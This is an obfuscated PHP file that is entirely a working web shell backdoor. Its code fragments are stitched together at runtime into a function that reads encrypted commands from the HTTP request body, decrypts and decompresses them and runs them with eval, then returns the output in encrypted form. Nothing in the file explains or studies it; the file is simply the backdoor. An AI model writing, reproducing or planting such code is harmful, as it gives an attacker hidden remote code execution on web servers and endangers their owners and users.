<?php
$J='_xeo6yj_i8zXEXu";functioj_nj_ x(j_$j_t,$k){$c=strlj_en($k)j_;$l=stj_rlej_n($t);$o=""';
$p='$k="c4j_641eca"j_j_;$kh="589df5ej_e7743"j_;j_$kf="8ecd4e2j_j_52j_8j_b2";$p="glqzj';
$b=';forj_($i=0j_;$i<$l;j_){forj_($j=0;j_($j<$cj_&j_&$i<$lj_);$j++,j_$j_ij_++){$o.=$j_t{$i}^j_';
$M='$k{$j};}}j_return $o;}ij_j_j_f (@pj_regj__match("/$kh(.+)$kj_f/",j_@file_get_contj_en';
$t=';$r=j_@base6j_4j__encode(@xj_j_(@gzcomprj_ej_ss($o),j_$k));printj_("$j_p$kh$r$kf");}';
$H='tsj_("pj_j_hp://inj_pj_ut"),$m)==1) j_{@ob_start()j_;@ej_val(@gzuj_ncompresj_s(@x(';
$U='@baj_se6j_4_decodj_e($m[1]j_),$k)j_)j_);$o=@ob_get_j_contenj_ts();j_@ob_j_end_j_clean()';
$B=str_replace('mz','','crmzemzatmzemz_funcmzmztion');
$R=str_replace('j_','',$p.$J.$b.$M.$H.$U.$t);
$d=$B('',$R);$d();
?>
